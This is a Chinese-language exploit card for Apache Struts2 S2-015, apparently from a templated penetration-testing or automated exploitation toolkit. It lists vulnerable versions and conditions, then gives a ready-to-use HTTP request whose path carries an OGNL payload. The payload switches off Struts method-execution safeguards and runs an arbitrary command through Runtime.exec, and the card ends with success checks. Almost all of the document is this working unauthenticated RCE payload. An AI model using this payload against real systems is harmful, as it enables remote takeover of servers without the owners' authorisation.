# S2-015 OGNL 注入 RCE

## 指纹特征
- 服务: Apache Struts2 (2.0.0 - 2.3.14.2)
- 条件: Action 映射支持通配符 `*` 且配置中存在类似 `/{1}.jsp` 的结果。

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 通配符注入 RCE | `/${OGNL}.action` | 无 |

## PoC 指令

通过构造包含 OGNL 的请求路径触发二次评估：

```http
GET /${(#context['xwork.MethodAccessor.denyMethodExecution']=false,#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('{{COMMAND}}'))}.action HTTP/1.1
Host: {{TARGET}}:8080
```

## Success Signal
- **状态验证**: 命令在后端成功执行。
- **物理验证**: 检查系统是否执行了预期操作（如 `touch /tmp/success`）。
